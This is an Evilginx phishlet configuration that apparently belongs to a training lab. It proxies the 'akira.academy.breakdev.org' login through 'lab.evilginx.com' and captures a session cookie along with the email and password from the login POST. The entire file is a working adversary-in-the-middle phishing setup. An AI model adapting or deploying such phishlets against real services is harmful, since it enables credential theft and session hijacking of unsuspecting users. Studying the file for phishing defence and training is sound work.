min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}
sub_filters:
#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_tokens:
  - domain: 'akira.academy.breakdev.org'
    keys: ['cookie_name']
credentials:
  username:
    key: 'email'
    search: '(.*)' # This is a regex pattern to search for the username in the POST request
    type: 'post'
  password:
    key: 'password'
    search: '(.*)' # This is a regex pattern to search for the password in the POST request
    type: 'post'
login:
  domain: 'akira.lab.evilginx.com'
  path: '/api/v1/auth/login'
